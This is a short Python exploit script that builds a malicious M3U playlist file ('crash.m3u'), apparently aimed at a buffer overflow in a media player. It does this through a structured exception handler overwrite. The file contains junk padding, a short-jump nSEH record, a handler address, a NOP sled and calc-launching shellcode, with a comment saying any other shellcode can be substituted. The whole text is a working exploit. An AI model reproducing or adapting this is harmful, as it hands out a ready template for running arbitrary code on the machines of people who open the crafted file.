magic   = "crash.m3u"
vuln    = "\x23\x0D\x0A\x23\x0D\x0A" # Extended M3U, no EXTM3U, no EXTINFO , can change OD for any  value \x1b,\x0a.........
 
junk        =   "\x41" * 816
ds_eax      =   "\x25\x25\x47\x7E" #First Call ds:[eax+8], Writeable memory address to put in EAX
morejunk    =   "\x42" * 8308
nSEH        =   "\xEB\x06\x90\x90" #short jmp 6 bytes 
SEH         =   "\x3F\x28\xD1\x72"#SEH Handler
nops        =   "\x90" * 10 #landing padd
shellcode   =   "\x8b\xec\x55\x8b\xec\x68\x20\x20\x20\x2f\x68\x63\x61\x6c\x63\x8d\x45\xf8\x50\xb8\xc7\x93\xc2\x77\xff\xd0" # Thanks  sud0, any other shell works too  just remove "\x00\x0a"
payload =   vuln+junk+ds_eax+morejunk+nSEH+SEH+nops+shellcode
 
file = open(magic , 'w')
file.write(payload)
file.close()